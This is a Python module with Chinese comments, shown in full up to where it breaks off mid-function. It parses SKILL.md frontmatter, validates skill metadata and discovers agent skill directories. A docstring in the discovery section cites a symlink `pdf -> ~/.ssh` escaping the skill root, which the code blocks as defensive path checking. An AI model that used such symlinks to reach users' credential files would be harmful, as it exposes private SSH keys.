r"""Agent Skills：发现、解析、合并、目录、激活、审批。shared/skills.ts 的 Python 镜像。

一个 skill 就是一个目录，里面有一份 SKILL.md：开头一段 YAML frontmatter
（至少 name 和 description），后面是正文。标准（agentskills.io）只规定了
**文件长什么样**。去哪找、找多深、用什么 YAML 语义、校验多严、同名谁赢、
超预算先砍谁、压缩时留多少、allowed-tools 什么时候自动放行——全是客户端自己的策略。
所以这个模块把「策略」做成参数。理由和来历都写在 skills.ts 那边，这里保留 ★ 坑。

两条贯穿全文件的纪律，都是为了让 TS 和 Python 的输出逐字节一致：
  · 长度一律按 Unicode 码点算。
  · 排序一律按码点比较。

─── Python 侧的差异 ───────────────────────────────────────────

天然就对的：
  · len(s) 就是码点数，s[:k] 按码点切，for ch in s 按码点走。
    TS 那边要专门写 cpLen / cpSlice，这里各是一行。
  · str 的比较就是码点序。sorted()、元组排序键、min / max 都不用 cmp_cp。
  · 普通 dict 没有原型链：`__proto__`、`constructor` 当 key 毫无特殊之处，
    `k in d` 就是 hasOwn。
  · `//` 就是向下取整的整数除法；hashlib 本来就按字节喂。

反而要小心的：
  · str.strip() 和 JS 的 trim() 去的字符不一样：JS 去 U+FEFF，Python 不去；
    Python 去 \x1c–\x1f 和 \x85，JS 不去。两边都只认空格和 tab：strip(" \t")。
  · str.splitlines() 还会在 U+2028、U+2029、\x0b、\x0c、\x1c–\x1e、\x85 上切。
    一律按 "\n" 切。
  · os.path.realpath 默认对不存在的路径不报错，原样拼回去。
    要 realpathSync 的「不存在就抛」，得加 strict=True。
  · os.path.join 不规范化路径，遇到绝对路径段还会丢掉前面所有段；
    Node 的 path.join 会规范化、也不丢段。这里用 _join 对齐。
  · json.dumps 默认分隔符是 ", " 和 ": "（带空格），默认还 ensure_ascii=True。
    要和 JSON.stringify 一样，得写 separators=(",", ":"), ensure_ascii=False。
  · yaml.safe_load 会把 `no` 变成 False、`1.0` 变成浮点（YAML 1.1 的规则）。
    这正是 frontmatter 不交给 YAML 库的原因；本模块不依赖 PyYAML。
  · 正则有三处语义不同：
      $      Python 里还匹配「末尾换行之前」。^…$ 一律改用 fullmatch，行内的 $ 改成 \Z。
      .      JS 不匹配 \n \r U+2028 U+2029，Python 只不匹配 \n。
      \s \b  Python 默认按 Unicode 判断；JS（不带 u 标志）的 \b 只认 ASCII 单词字符，
             \s 多认 U+FEFF、少认 \x1c–\x1f 和 \x85。
    这三处由 _js() 收口。另外 JS 的 re.test(s) 对应 re.search，不是 re.match。
  · 读文件要 newline=""：text 模式默认会把 \r\n 换成 \n。这里碰巧无害
    （split_frontmatter 也会换），但不该依赖。
"""

from __future__ import annotations

import hashlib
import os
import re
import stat
from collections.abc import Callable, Sequence
from dataclasses import dataclass, replace
from functools import cmp_to_key
from typing import Any, Literal, NamedTuple

from shared.context_budget import estimate_tokens
from shared.sandbox import SafePath, SafePathErr, SafePathOk, safe_path

# ─────────────────────────────────────────────────────────────
# 零、码点工具
# ─────────────────────────────────────────────────────────────


def cp_len(s: str) -> int:
    return len(s)


def cp_slice(s: str, k: int) -> str:
    return s[:k]


def cmp_cp(a: str, b: str) -> int:
    """按码点比较。Python 的 str 比较天然就是这个语义；保留它只为和 TS 一一对应。"""
    return (a > b) - (a < b)


def trim_sp(s: str) -> str:
    """只去空格和 tab。★ 不要用无参 strip()：它和 JS 的 trim() 去的字符集都不一样。"""
    return s.strip(" \t")


def xml_escape(s: str) -> str:
    return (
        s.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )


_JS_DOT = r"[^\n\r\u2028\u2029]"
_JS_SPACE = r"[\t\n\v\f\r \u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]"


def _js(src: str) -> re.Pattern[str]:
    r"""把 TS 正则的原文编译成同义的 Python 正则。只处理本文件用到的写法。

    ★ `.*` 换成不含 JS 行终止符的版本，`\s` 换成 JS 的空白集合，
      re.ASCII 让 `\b` 只认 ASCII 单词字符。锚点不在这里处理：调用方用 fullmatch。
    """
    return re.compile(src.replace(".*", _JS_DOT + "*").replace(r"\s", _JS_SPACE), re.ASCII)


def _join(*parts: str) -> str:
    """Node 的 path.join：用 / 接起来再规范化。"""
    return os.path.normpath("/".join(parts))


# ─────────────────────────────────────────────────────────────
# 一、诊断
# ─────────────────────────────────────────────────────────────

DiagCode = Literal[
    "NO_FRONTMATTER",
    "UNTERMINATED",
    "UNSUPPORTED_YAML",
    "DUPLICATE_KEY",
    "COLON_IN_PLAIN",
    "NAME_MISSING",
    "NAME_CHARSET",
    "NAME_LENGTH",
    "NAME_DIR_MISMATCH",
    "DESC_MISSING",
    "DESC_LENGTH",
    "COMPAT_LENGTH",
    "METADATA_SHAPE",
    "BAD_TYPE",
    "UNKNOWN_FIELD",
    "BAD_BOOLEAN",
    "INVISIBLE_CHARS",
    "LOWERCASE_SKILL_MD",
    "TOO_DEEP",
    "TOO_MANY_DIRS",
    "SYMLINK_ESCAPES_ROOT",
    "UNRESOLVABLE",
]


@dataclass
class Diag:
    level: Literal["error", "warning"]
    code: DiagCode
    field: str | None
    path: str | None
    """只有 discover 会填。解析与校验本身不知道文件在哪。"""
    message: str


def _err(code: DiagCode, field: str | None, message: str) -> Diag:
    return Diag("error", code, field, None, message)


def _warn(code: DiagCode, field: str | None, message: str) -> Diag:
    return Diag("warning", code, field, None, message)


# ─────────────────────────────────────────────────────────────
# 二、frontmatter：一个刻意收窄的 YAML 子集
#
# 同一段 frontmatter，PyYAML、js-yaml、yaml、strictyaml 四个解析器在 24 个样例里
# 只有 7 个结果一致。子集的边界一句话：**四个解析器结果一致的构造照常支持；
# 不一致的要么拒绝，要么在字段层用显式规则收口。** 所有标量一律是字符串。
# ─────────────────────────────────────────────────────────────

FmValue = str | list[str] | dict[str, str]


@dataclass
class Frontmatter:
    fields: dict[str, FmValue]
    order: list[str]
    """原文里 key 的顺序。"""


@dataclass
class SplitOk:
    yaml: list[str]
    body: str
    ok: Literal[True] = True


@dataclass
class SplitErr:
    diag: Diag
    ok: Literal[False] = False


SplitResult = SplitOk | SplitErr


def split_frontmatter(text: str) -> SplitResult:
    r"""切出 frontmatter 的行和正文。

    ★ 结束符是「之后第一个恰好等于 --- 的整行」，不是第一次出现的 --- 子串。
      参考校验器 skills-ref 用 split('---', 2)，于是 `description: a --- b` 被截成 `a`。
    ★ 先去 BOM、把 CRLF 和孤立的 CR 都换成 LF，再按 '\n' 切。不用 splitlines()。
    """
    t = text[1:] if text.startswith("\ufeff") else text
    t = t.replace("\r\n", "\n").replace("\r", "\n")
    lines = t.split("\n")
    if lines[0] != "---":
        return SplitErr(_err("NO_FRONTMATTER", None, "第一行必须恰好是 ---。"))
    try:
        end = lines.index("---", 1)
    except ValueError:
        return SplitErr(_err("UNTERMINATED", None, "frontmatter 没有结束的 --- 行。"))
    return SplitOk(yaml=lines[1:end], body="\n".join(lines[end + 1 :]).lstrip("\n"))


@dataclass
class ScalarOk:
    value: str
    colon: bool
    """plain 标量里出现了 `: ` 或以 `:` 结尾。"""
    ok: Literal[True] = True


@dataclass
class ScalarErr:
    message: str
    ok: Literal[False] = False


ScalarResult = ScalarOk | ScalarErr

_PLAIN_FORBIDDEN_START = frozenset("[{&*!%@`|>")
_HEX4 = re.compile(r"[0-9A-Fa-f]{4}")


def parse_scalar(raw: str) -> ScalarResult:
    r"""解析一个单行标量：`key: ` 之后的那段（已去掉首尾空格）。

    支持：plain、"双引号"（转义只认 \\ \" \n \t \uXXXX）、'单引号'（'' 表示 '）、行尾注释。
    拒绝：flow [ ] { }、锚点 &、别名 *、标签 !、保留字符 % @ `。

    ★ 不做任何类型推断。1.0、no、0123、~、null、2026-10-12 全部原样返回字符串。
    """
    s = trim_sp(raw)
    if s == "" or s.startswith("#"):
        return ScalarOk("", False)
    c0 = s[0]
    if c0 == '"':
        return _parse_double_quoted(s)
    if c0 == "'":
        return _parse_single_quoted(s)
    if c0 in _PLAIN_FORBIDDEN_START:
        return ScalarErr(f"不支持以 {c0} 开头的值（flow、锚点、别名、标签或保留字符）。")
    if s.startswith("- ") or s == "-" or s.startswith("? "):
        return ScalarErr("不支持这种写法；列表请换行写成 `  - item`。")
    h = s.find(" #")
    value = trim_sp(s[:h] if h >= 0 else s)
    return ScalarOk(value, ": " in value or value.endswith(":"))


def _after_quote(rest: str) -> bool:
    r = trim_sp(rest)
    return r == "" or (r.startswith("#") and rest.startswith((" ", "\t")))


def _parse_double_quoted(s: str) -> ScalarResult:
    out = ""
    i = 1
    while i < len(s):
        ch = s[i]
        if ch == '"':
            if not _after_quote(s[i + 1 :]):
                return ScalarErr("引号结束后还有多余的内容。")
            return ScalarOk(out, False)
        if ch == "\\":
            e = s[i + 1] if i + 1 < len(s) else ""
            if e in ("\\", '"'):
                out += e
            elif e == "n":
                out += "\n"
            elif e == "t":
                out += "\t"
            elif e == "u":
                hex4 = s[i + 2 : i + 6]
                if not _HEX4.fullmatch(hex4):
                    return ScalarErr("\\u 后面要跟四位十六进制。")
                cp = int(hex4, 16)
                # 代理对两边的语言处理不一样（JS 会把两个半边拼成一个字符，Python 不会），直接拒绝
                if 0xD800 <= cp <= 0xDFFF:
                    return ScalarErr("不支持用 \\u 写代理对。")
                out += chr(cp)
                i += 6
                continue
            else:
                return ScalarErr(f"不支持的转义：\\{e}")
            i += 2
            continue
        out += ch
        i += 1
    return ScalarErr("双引号没有闭合（不支持跨行的引号字符串）。")


def _parse_single_quoted(s: str) -> ScalarResult:
    out = ""
    i = 1
    while i < len(s):
        ch = s[i]
        if ch == "'":
            if s[i + 1 : i + 2] == "'":
                out += "'"
                i += 2
                continue
            if not _after_quote(s[i + 1 :]):
                return ScalarErr("引号结束后还有多余的内容。")
            return ScalarOk(out, False)
        out += ch
        i += 1
    return ScalarErr("单引号没有闭合（不支持跨行的引号字符串）。")


@dataclass
class BlockOk:
    value: str
    ok: Literal[True] = True


@dataclass
class BlockErr:
    message: str
    ok: Literal[False] = False


BlockResult = BlockOk | BlockErr

_BLOCK_HEADERS = frozenset(("|", "|-", ">", ">-"))
_HEADER_COMMENT = re.compile(r"[ \t]#")


def _blank(s: str) -> bool:
    return s.strip(" \t") == ""


def _indent(s: str) -> int:
    return len(s) - len(s.lstrip(" "))


def block_scalar(header: str, lines: list[str]) -> BlockResult:
    r"""块标量。header 是 `|`、`|-`、`>`、`>-` 之一（可带行尾注释）；lines 是紧跟其后的、
    带原始缩进的续行（含空行）。

    ★ clip（`|` 和 `>`）固定为「恰好一个末尾 \n」，和输入末尾有没有换行无关。
      strip（`|-` 和 `>-`）没有末尾换行。
    ★ 缩进由第一个非空行决定。比它缩得少的非空行是错误。
    ★ folded 里比基准缩进更深的行，YAML 规定不折叠，这里直接拒绝，免得和真 YAML 不一致。
    不支持 `|+`、`>+` 和显式缩进指示符。
    """
    m = _HEADER_COMMENT.search(header)
    h = trim_sp(header[: m.start()] if m else header)
    if h not in _BLOCK_HEADERS:
        return BlockErr(f"不支持的块标量写法：{h}")
    folded = h[0] == ">"
    strip = h.endswith("-")

    start = 0
    while start < len(lines) and _blank(lines[start]):
        start += 1
    if start == len(lines):
        return BlockOk("")
    n = _indent(lines[start])

    body: list[str] = []
    for ln in lines[start:]:
        if _blank(ln):
            body.append("")
            continue
        ind = _indent(ln)
        if ind < n:
            return BlockErr("块标量里有一行缩进比第一行少。")
        if folded and ind > n:
            return BlockErr("折叠块（>）里不支持更深的缩进。")
        body.append(ln[n:])
    while body and body[-1] == "":
        body.pop()

    if not folded:
        content = "\n".join(body)
    else:
        content = body[0]
        empties = 0
        for ln in body[1:]:
            if ln == "":
                empties += 1
                continue
            content += "\n" * empties if empties > 0 else " "
            empties = 0
            content += ln
    if strip or content == "":
        return BlockOk(content)
    return BlockOk(content + "\n")


@dataclass
class ParseOk:
    fm: Frontmatter
    body: str
    diags: list[Diag]
    ok: Literal[True] = True


@dataclass
class ParseErr:
    diags: list[Diag]
    ok: Literal[False] = False


ParseResult = ParseOk | ParseErr
ParseMode = Literal["strict", "lenient"]
Parser = Callable[[str, ParseMode], ParseResult]


@dataclass(frozen=True)
class ParserParts:
    split: Callable[[str], SplitResult]
    scalar: Callable[[str], ScalarResult]
    block: Callable[[str, list[str]], BlockResult]


REQUIRED_FIELDS = ("name", "description")
"""lenient 模式下，这两个字段出了解析问题就整条 skill 不要；其它字段保留原文并告警。"""

_KEY_LINE = _js(r"([A-Za-z_][A-Za-z0-9_.-]*):(.*)")
_NESTED_KEY = _js(r" {2}([A-Za-z_][A-Za-z0-9_.-]*):(.*)")


def _comment(s: str) -> bool:
    return s.lstrip(" ").startswith("#")


def _tab_indent(s: str) -> bool:
    return s.lstrip(" ").startswith("\t")


def _is_seq_line(s: str) -> bool:
    return s == "-" or s.startswith("- ")


def _is_nested_seq_line(s: str) -> bool:
    return s == "  -" or s.startswith("  - ")


def make_parser(parts: ParserParts) -> Parser:
    """用三个零件拼出一个解析器。verify 用它把你写的零件装进同一条流水线。

    strict：遇到第一个错误就失败，像 YAML 库那样。给作者用（CI、提交前检查）。
    lenient：能救的就救，并留下 warning。给运行时用——别的客户端写的 skill
      常常带着「它的解析器碰巧接受」的不规范写法，最常见的是没加引号的 `: `。
    """

    def parse(text: str, mode: ParseMode) -> ParseResult:
        sp = parts.split(text)
        if not sp.ok:
            return ParseErr([sp.diag])
        lines = sp.yaml
        fields: dict[str, FmValue] = {}
        order: list[str] = []
        diags: list[Diag] = []

        def fatal(d: Diag) -> ParseResult:
            return ParseErr([*diags, d])

        i = 0
        while i < len(lines):
            line = lines[i]
            if _blank(line) or _comment(line):
                i += 1
                continue
            if _tab_indent(line):
                return fatal(_err("UNSUPPORTED_YAML", None, "不支持用 tab 缩进。"))
            if line[0] == " ":
                return fatal(_err("UNSUPPORTED_YAML", None, f"第 {i + 2} 行缩进不对。"))
            m = _KEY_LINE.fullmatch(line)
            if not m or (m[2] != "" and m[2][0] != " "):
                msg = f"第 {i + 2} 行不是 key: value 的形状。"
                return fatal(_err("UNSUPPORTED_YAML", None, msg))
            key: str = m[1]
            rest = trim_sp(m[2])
            if rest.startswith("#"):
                rest = ""
            if key in fields:
                return fatal(_err("DUPLICATE_KEY", key, f"字段 {key} 出现了两次。"))

            # 续行：空行、缩进行；值为空时还包括顶格的 `- ` 列表项
            j = i + 1
            cont: list[str] = []
            while j < len(lines) and (
                _blank(lines[j])
                or lines[j].startswith((" ", "\t"))
                or (rest == "" and _is_seq_line(lines[j]))
            ):
                cont.append(lines[j])
                j += 1
            if any(_tab_indent(x) and not _blank(x) for x in cont):
                return fatal(_err("UNSUPPORTED_YAML", key, "不支持用 tab 缩进。"))
            trimmed = list(cont)
            while trimmed and _blank(trimmed[-1]):
                trimmed.pop()
            content = [x for x in trimmed if not _comment(x) or _is_seq_line(x)]

            # 一个字段的值解析失败时怎么办，按 mode 和字段决定
            failed: str | None = None
            value: FmValue = ""
            colon = False

            if rest.startswith(("|", ">")):
                b = parts.block(rest, cont)
                if b.ok:
                    value = b.value
                else:
                    failed = b.message
            elif rest == "":
                nonblank = [x for x in content if not _blank(x)]
                nested = [_NESTED_KEY.fullmatch(x) for x in nonblank]
                if not nonblank:
                    value = ""
                elif all(_is_seq_line(x) for x in nonblank) or all(
                    _is_nested_seq_line(x) for x in nonblank
                ):
                    items: list[str] = []
                    for x in nonblank:
                        r = parts.scalar(re.sub(r"^ *-", "", x, count=1))
                        if not r.ok:
                            failed = r.message
                            break
                        colon = colon or r.colon
                        items.append(r.value)
                    value = items
                elif all(nested):
                    mp: dict[str, str] = {}
                    for mm in nested:
                        k2: str = mm[1]  # type: ignore[index]
                        r2: str = mm[2]  # type: ignore[index]
                        if r2 != "" and r2[0] != " ":
                            failed = f"{key}.{k2} 的冒号后面要有空格。"
                            break
                        if k2 in mp:
                            msg = f"字段 {key}.{k2} 出现了两次。"
                            return fatal(_err("DUPLICATE_KEY", key, msg))
                        r = parts.scalar(r2)
                        if not r.ok:
                            if mode == "strict":
                                failed = r.message
                                break
                            # lenient：这一项保留原文
                            mp[k2] = trim_sp(r2)
                            msg = f"{key}.{k2}：{r.message} 已按原文保留。"
                            diags.append(_warn("UNSUPPORTED_YAML", key, msg))
                            continue
                        colon = colon or r.colon
                        mp[k2] = r.value
                    value = mp
                else:
                    failed = "只支持一层嵌套：两个空格缩进的 `key: value`，或者 `- item` 列表。"
            else:
                nonblank = [x for x in content if not _blank(x)]
                if nonblank and rest[0] in ('"', "'"):
                    failed = "不支持跨行的引号字符串。"
                elif any(_blank(x) for x in trimmed):
                    failed = "多段的 plain 文本请改用 | 或 > 块。"
                else:
                    # 多行 plain：YAML 把续行用空格接起来，四个解析器在这点上一致
                    joined = " ".join([rest, *(trim_sp(x) for x in nonblank)])
                    r = parts.scalar(joined)
                    if r.ok:
                        value = r.value
                        colon = r.colon
                    else:
                        failed = r.message

            if failed is not None:
                if mode == "strict" or key in REQUIRED_FIELDS:
                    return fatal(_err("UNSUPPORTED_YAML", key, f"字段 {key}：{failed}"))
                raw_lines = [rest, *(trim_sp(x) for x in content if not _blank(x))]
                value = trim_sp("\n".join(raw_lines))
                msg = f"字段 {key}：{failed} 已按原文保留。"
                diags.append(_warn("UNSUPPORTED_YAML", key, msg))
            elif colon:
                if mode == "strict":
                    msg = f'字段 {key} 的值里有 ": "，要加引号。'
                    return fatal(_err("COLON_IN_PLAIN", key, msg))
                msg = f'字段 {key} 的值里有 ": "，已按整行文本处理。'
                diags.append(_warn("COLON_IN_PLAIN", key, msg))
            fields[key] = value
            order.append(key)
            i = j
        return ParseOk(Frontmatter(fields, order), sp.body, diags)

    return parse


parse_frontmatter = make_parser(
    ParserParts(split=split_frontmatter, scalar=parse_scalar, block=block_scalar)
)

# ─────────────────────────────────────────────────────────────
# 三、校验：严格和宽松是两个函数，不是一个开关
#
# 同一个 name 与目录名不一致的 skill，规范说无效，客户端实现指南说「警告并照常加载」。
# 作者侧要严，运行时要宽，两者对同一输入给出不同结论是**正确行为**。
# ─────────────────────────────────────────────────────────────

MAX_NAME = 64
MAX_DESC = 1024
MAX_COMPAT = 500

SPEC_FIELDS = ("name", "description", "license", "compatibility", "metadata", "allowed-tools")
"""规范定义的六个字段。加上 EXTENSION_FIELDS 两个被广泛使用的客户端扩展，是本 lab 的作者侧策略。"""
EXTENSION_FIELDS = ("disable-model-invocation", "user-invocable")
_KNOWN_FIELDS = frozenset((*SPEC_FIELDS, *EXTENSION_FIELDS))
_CORE_FIELDS = frozenset(("name", "description", "allowed-tools", *EXTENSION_FIELDS))

NameCode = Literal["NAME_MISSING", "NAME_LENGTH", "NAME_CHARSET"]

_NAME_RE = re.compile(r"[a-z0-9]+(-[a-z0-9]+)*")


def validate_name(name: str) -> NameCode | None:
    r"""★ 规范里同时写着 "unicode lowercase alphanumeric" 和 "(a-z, 0-9)"。
      这里取窄的那个：ASCII 小写字母、数字、单个连字符，不以连字符开头或结尾。
      skills-ref 用 isalnum() 加 NFKC，于是放行了「技能」和全角字母。
    ★ 长度按码点算。
    ★ 用 fullmatch，不用 re.match(r"^…$")：后者会放行 "pdf\n"。
    """
    if name == "":
        return "NAME_MISSING"
    if cp_len(name) > MAX_NAME:
        return "NAME_LENGTH"
    if not _NAME_RE.fullmatch(name):
        return "NAME_CHARSET"
    return None


_NAME_MESSAGES: dict[NameCode, str] = {
    "NAME_MISSING": "name 不能为空。",
    "NAME_LENGTH": f"name 最长 {MAX_NAME} 个字符。",
    "NAME_CHARSET": "name 只能用小写字母、数字和单个连字符，且不能以连字符开头或结尾。",
}

# 零宽字符、方向控制符、行/段分隔符、BOM、软连字符。不含全角字符：中文 description 里全是全角标点。
_INVISIBLE = re.compile(r"[\u00ad\u200b-\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069\ufeff]")


def has_invisible(s: str) -> bool:
    return _INVISIBLE.search(s) is not None


def parse_allowed_tools(v: FmValue | None) -> list[str]:
    """allowed-tools 是空格分隔的列表，但 `Bash(git status)` 括号里也有空格。只在括号外切。"""
    if v is None:
        return []
    if isinstance(v, list):
        return [x for x in (trim_sp(t) for t in v) if x != ""]
    if not isinstance(v, str):
        return []
    out: list[str] = []
    cur = ""
    depth = 0
    for ch in v:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth = max(0, depth - 1)
        if depth == 0 and ch in (" ", "\t", ",", "\n"):
            if cur != "":
                out.append(cur)
            cur = ""
            continue
        cur += ch
    if cur != "":
        out.append(cur)
    return out


@dataclass
class SkillCore:
    name: str
    description: str
    model_invocable: bool
    user_invocable: bool
    allowed_tools: list[str]
    extra: dict[str, FmValue]
    """核心字段之外的一切，原样保留（license、compatibility、metadata、未知字段）。"""


@dataclass
class LoadOk:
    core: SkillCore
    diags: list[Diag]
    load: Literal[True] = True


@dataclass
class LoadSkip:
    diags: list[Diag]
    load: Literal[False] = False


LoadResult = LoadOk | LoadSkip


@dataclass(frozen=True)
class ValidatorParts:
    validate_name: Callable[[str], NameCode | None]
    cp_len: Callable[[str], int]


class Validator(NamedTuple):
    validate_strict: Callable[[Frontmatter, str], list[Diag]]
    load_lenient: Callable[[Frontmatter, str], LoadResult]


def make_validator(parts: ValidatorParts) -> Validator:
    def validate_strict(fm: Frontmatter, dir_name: str) -> list[Diag]:
        out: list[Diag] = []
        f = fm.fields
        for k in fm.order:
            if k not in _KNOWN_FIELDS:
                out.append(_err("UNKNOWN_FIELD", k, f"未知字段 {k}。"))
        name = f.get("name")
        if name is None or (isinstance(name, str) and trim_sp(name) == ""):
            out.append(_err("NAME_MISSING", "name", _NAME_MESSAGES["NAME_MISSING"]))
        elif not isinstance(name, str):
            out.append(_err("BAD_TYPE", "name", "name 必须是字符串。"))
        else:
            code = parts.validate_name(name)
            if code:
                out.append(_err(code, "name", _NAME_MESSAGES[code]))
            if name != dir_name:
                msg = f"name「{name}」和目录名「{dir_name}」不一致。"
                out.append(_err("NAME_DIR_MISMATCH", "name", msg))
        desc = f.get("description")
        if desc is None or (isinstance(desc, str) and trim_sp(desc) == ""):
            out.append(_err("DESC_MISSING", "description", "description 不能为空。"))
        elif not isinstance(desc, str):
            out.append(_err("BAD_TYPE", "description", "description 必须是字符串。"))
        elif parts.cp_len(desc) > MAX_DESC:
            msg = f"description 最长 {MAX_DESC} 个字符。"
            out.append(_err("DESC_LENGTH", "description", msg))
        for k in ("license", "compatibility"):
            v = f.get(k)
            if v is not None and not isinstance(v, str):
                out.append(_err("BAD_TYPE", k, f"{k} 必须是字符串。"))
        compat = f.get("compatibility")
        if isinstance(compat, str) and parts.cp_len(compat) > MAX_COMPAT:
            msg = f"compatibility 最长 {MAX_COMPAT} 个字符。"
            out.append(_err("COMPAT_LENGTH", "compatibility", msg))
        meta = f.get("metadata")
        if meta is not None and not isinstance(meta, dict):
            msg = "metadata 必须是字符串到字符串的映射。"
            out.append(_err("METADATA_SHAPE", "metadata", msg))
        if isinstance(f.get("allowed-tools"), dict):
            msg = "allowed-tools 必须是字符串或列表。"
            out.append(_err("BAD_TYPE", "allowed-tools", msg))
        for k in EXTENSION_FIELDS:
            v = f.get(k)
            if v is not None and v != "true" and v != "false":
                out.append(_err("BAD_BOOLEAN", k, f"{k} 只能是 true 或 false。"))
        for k in ("name", "description"):
            v = f.get(k)
            if isinstance(v, str) and has_invisible(v):
                out.append(_warn("INVISIBLE_CHARS", k, f"{k} 里有不可见字符。"))
        return out

    def load_lenient(fm: Frontmatter, dir_name: str) -> LoadResult:
        diags: list[Diag] = []
        f = fm.fields
        desc = f.get("description")
        if not isinstance(desc, str) or trim_sp(desc) == "":
            msg = "没有 description，模型无从判断何时使用，跳过。"
            return LoadSkip([_err("DESC_MISSING", "description", msg)])
        if parts.cp_len(desc) > MAX_DESC:
            msg = f"description 超过 {MAX_DESC} 个字符，目录里会被截短。"
            diags.append(_warn("DESC_LENGTH", "description", msg))
        raw = f.get("name")
        if not isinstance(raw, str) or trim_sp(raw) == "":
            name = dir_name
            diags.append(_warn("NAME_MISSING", "name", f"没有 name，用目录名「{dir_name}」代替。"))
        else:
            name = raw
            code = parts.validate_name(raw)
            if code:
                diags.append(_warn(code, "name", _NAME_MESSAGES[code]))
            if raw != dir_name:
                msg = f"name「{raw}」和目录名「{dir_name}」不一致，照常加载。"
                diags.append(_warn("NAME_DIR_MISMATCH", "name", msg))

        def flag(k: str, dflt: bool) -> bool:
            v = f.get(k)
            if v is None:
                return dflt
            if v == "true":
                return True
            if v == "false":
                return False
            diags.append(_warn("BAD_BOOLEAN", k, f"{k} 只认 true 或 false，按默认值处理。"))
            return dflt

        model_invocable = not flag("disable-model-invocation", False)
        user_invocable = flag("user-invocable", True)
        tools = f.get("allowed-tools")
        if isinstance(tools, dict):
            msg = "allowed-tools 必须是字符串或列表，已忽略。"
            diags.append(_warn("BAD_TYPE", "allowed-tools", msg))
        for k in ("name", "description"):
            v = f.get(k)
            if isinstance(v, str) and has_invisible(v):
                diags.append(_warn("INVISIBLE_CHARS", k, f"{k} 里有不可见字符。"))
        extra = {k: f[k] for k in fm.order if k not in _CORE_FIELDS}
        core = SkillCore(
            name=name,
            description=desc,
            model_invocable=model_invocable,
            user_invocable=user_invocable,
            allowed_tools=parse_allowed_tools(tools),
            extra=extra,
        )
        return LoadOk(core, diags)

    return Validator(validate_strict, load_lenient)


validate_strict, load_lenient = make_validator(
    ValidatorParts(validate_name=validate_name, cp_len=cp_len)
)

# ─────────────────────────────────────────────────────────────
# 四、skill 记录
# ─────────────────────────────────────────────────────────────

Scope = Literal["builtin", "enterprise", "user", "project"]
Trust = Literal["builtin", "user", "project-trusted", "project-untrusted"]


@dataclass
class SkillMeta(SkillCore):
    location: str
    """SKILL.md 的路径。"""
    dir: str
    scope: Scope
    trust: Trust
    alias: str | None
    """从哪一类目录来：'.agents'、'.claude'、'.gemini' ……"""


@dataclass(frozen=True)
class SkillCtx:
    dir: str
    scope: Scope
    trust: Trust
    alias: str | None = None


class FromText(NamedTuple):
    skill: SkillMeta | None
    diags: list[Diag]


def skill_from_text(
    text: str,
    ctx: SkillCtx,
    parse: Parser = parse_frontmatter,
    load: Callable[[Frontmatter, str], LoadResult] = load_lenient,
) -> FromText:
    """从文本直接造一条记录，不碰文件系统。观察实验和 verify 用它。"""
    p = parse(text, "lenient")
    if not p.ok:
        return FromText(None, p.diags)
    dir_name = ctx.dir.split("/")[-1]
    ld = load(p.fm, dir_name)
    if not ld.load:
        return FromText(None, [*p.diags, *ld.diags])
    skill = SkillMeta(
        **vars(ld.core),
        location=f"{ctx.dir}/SKILL.md",
        dir=ctx.dir,
        scope=ctx.scope,
        trust=ctx.trust,
        alias=ctx.alias,
    )
    return FromText(skill, [*p.diags, *ld.diags])


# ─────────────────────────────────────────────────────────────
# 五、发现
# ─────────────────────────────────────────────────────────────


@dataclass(frozen=True)
class SkillRoot:
    dir: str
    scope: Scope
    trust: Trust
    alias: str | None = None


@dataclass(frozen=True)
class DiscoverOpts:
    max_depth: int = 6
    max_dirs: int = 2000
    skip: tuple[str, ...] = (".git", "node_modules")


DEFAULT_DISCOVER = DiscoverOpts()


class Discovered(NamedTuple):
    skills: list[SkillMeta]
    diags: list[Diag]


def discover(roots: Sequence[SkillRoot], opts: DiscoverOpts = DEFAULT_DISCOVER) -> Discovered:
    """在若干根目录下找 skill。

    ★ 每一层 scandir 的结果都按码点排序。scandir 的顺序取决于文件系统，
      「同层同名取先找到的」在不排序的遍历下就是「随机」。
    ★ 找到 SKILL.md 的目录就是叶子，不再往下找：references/x/SKILL.md 不是另一个 skill。
    ★ 认 SKILL.md 时比较的是 scandir 返回的名字，不用 os.path.exists：macOS 默认文件系统
      不分大小写，exists('SKILL.md') 对 skill.md 也返回 True。
    ★ 符号链接只在落点仍在根内时才跟。根内的 `pdf -> ~/.ssh` 必须被拦下。
    ★ 超过深度或目录数上限时留一条诊断，不静默。
    """
    skills: list[SkillMeta] = []
    diags: list[Diag] = []
    for root in roots:
        _discover_root(root, opts, skills, diags)
    return Discovered(skills, diags)


def _at(d: Diag, path: str) -> Diag:
    return replace(d, path=path)


def _discover_root(
    root: SkillRoot, opts: DiscoverOpts, skills: list[SkillMeta], diags: list[Diag]
) -> None:
    # ★ 根不存在就跳过。不加 strict=True 的话 realpath 会原样返回一个看起来正常的路径。
    try:
        real_root = os.path.realpath(root.dir, strict=True)
    except OSError:
        return
    skip = set(opts.skip)
    visited = {real_root}
    dirs = 0
    stopped = False

    def load(d: str) -> None:
        location = _join(d, "SKILL.md")
        with open(location, encoding="utf-8", errors="replace", newline="") as fh:
            text = fh.read()
        p = parse_frontmatter(text, "lenient")
        if not p.ok:
            diags.extend(_at(x, location) for x in p.diags)
            return
        ld = load_lenient(p.fm, os.path.basename(d))
        diags.extend(_at(x, location) for x in [*p.diags, *ld.diags])
        if not ld.load:
            return
        skills.append(
            SkillMeta(
                **vars(ld.core),
                location=location,
                dir=d,
                scope=root.scope,
                trust=root.trust,
                alias=root.alias,
            )
        )

    def escapes(full: str) -> Diag | None:
        sp = safe_path(root.dir, os.path.relpath(full, root.dir), True)
        if sp.ok:
            return None
        code: DiagCode = (
            "SYMLINK_ESCAPES_ROOT" if sp.code == "SYMLINK_ESCAPES_ROOT" else "UNRESOLVABLE"
        )
        return _at(_warn(code, None, "符号链接指向根目录之外或无法解析，跳过。"), full)

    def walk(d: str, depth: int) -> None:
        nonlocal dirs, stopped
        if stopped:
            return
        if dirs >= opts.max_dirs:
            stopped = True
            msg = f"扫描的目录数超过上限 {opts.max_dirs}，停止。"
            diags.append(_at(_warn("TOO_MANY_DIRS", None, msg), root.dir))
            return
        dirs += 1
        try:
            with os.scandir(d) as it:
                entries = sorted(it, key=lambda e: e.name)
        except OSError:
